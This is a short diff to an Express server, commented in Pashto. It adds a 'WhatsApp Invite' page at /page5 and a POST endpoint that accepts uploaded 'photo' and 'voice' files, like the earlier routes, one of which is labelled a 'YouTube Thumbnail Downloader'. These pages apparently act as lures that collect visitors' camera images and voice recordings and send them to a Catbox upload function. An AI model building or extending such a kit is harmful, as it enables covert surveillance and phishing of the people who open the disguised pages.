@@ -43,9 +43,13 @@ app.get('/page3', (req, res) => {
     res.sendFile(path.join(__dirname, 'index3.html'));
 });
 
-// --- نوی اضافه شوی مسیر د YouTube Thumbnail Downloader لپاره (/page4) ---
 app.get('/page4', (req, res) => {
     res.sendFile(path.join(__dirname, 'index4.html'));
+});
+
+// --- نوی اضافه شوی مسیر د WhatsApp Invite لپاره (/page5) ---
+app.get('/page5', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index5.html'));
 });
 
 // Catbox ته د فایل د اپلوډ کولو فنکشن
@@ -75,8 +79,12 @@ app.post('/page3', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async 
     handleIncomingData(req, res);
 });
 
-// د نوي /page4 پاڼې پوسټ ریکویسټ
 app.post('/page4', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
+    handleIncomingData(req, res);
+});
+
+// د نوي /page5 پاڼې پوسټ ریکویسټ
+app.post('/page5', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
     handleIncomingData(req, res);
 });
 
